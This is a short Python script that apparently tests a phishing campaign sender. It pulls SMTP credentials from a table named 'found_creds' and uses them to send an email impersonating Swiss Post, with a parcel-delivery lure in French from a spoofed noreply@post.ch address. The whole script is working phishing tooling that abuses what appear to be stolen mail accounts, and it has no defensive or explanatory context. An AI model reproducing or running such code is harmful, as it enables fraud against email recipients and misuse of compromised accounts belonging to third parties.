import sys, sqlite3, traceback
sys.path.insert(0, '/opt/darkvasend')
if 'auditguard.campaign_sender' in sys.modules:
    del sys.modules['auditguard.campaign_sender']
from auditguard.campaign_sender import _send_one

db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row
r = db.execute('SELECT * FROM found_creds WHERE id=6').fetchone()
db.close()

smtp_config = {
    'host': r['smtp_host'], 'port': r['smtp_port'],
    'username': r['smtp_user'], 'password': r['smtp_password'],
    'from_email': r['smtp_user'],
}

# Test with simple content
print('Test #6 with simple HTML...', flush=True)
try:
    result = _send_one(
        smtp_config,
        'Swiss Post',
        'noreply@post.ch',
        'numerique.fiscal@gmail.com',
        'Votre envoi est en cours',
        '<p>Bonjour, votre colis est en livraison.</p>',
        '',
        smtp_config['from_email'],
        'noreply@post.ch',
        'clean',
        None,
    )
    print(f'Simple: {result}', flush=True)
except Exception as e:
    print(f'Exception: {e}', flush=True)
